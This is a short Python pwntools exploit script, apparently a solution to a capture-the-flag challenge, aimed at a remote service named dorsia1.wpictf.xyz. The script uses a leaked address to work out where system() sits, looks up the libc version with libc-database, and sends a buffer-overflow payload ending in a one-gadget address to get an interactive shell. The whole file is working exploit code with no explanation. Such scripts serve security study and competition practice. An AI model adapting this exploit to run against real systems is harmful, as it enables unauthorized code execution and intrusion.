#!/usr/bin/env python3

from pwn import *

p = remote('dorsia1.wpictf.xyz',31337)

_ = p.recvline().strip()

system = int(_,16) - 765772
print(hex(system))

import os
stream = os.popen("libc-database/find system " + str(hex(system & 0xFFF)) + " | grep /glibc/ | sed 's/)//' | awk '{print $NF}'")
output = stream.read().strip()
stream.close()

libc = ELF('libc-database/db/' + output + '.so')
baselibc = system - libc.symbols['system']
print("libc:" + str(hex(baselibc)))
print('libc-database/db/' + output + '.so')

gadget = 0x4f322

payload  = 69 * b'A'
payload += 8 * b'B'
payload += p64(baselibc + gadget)
payload += (96 - len(payload)) * p8(0)

p.sendline(payload)
p.interactive()
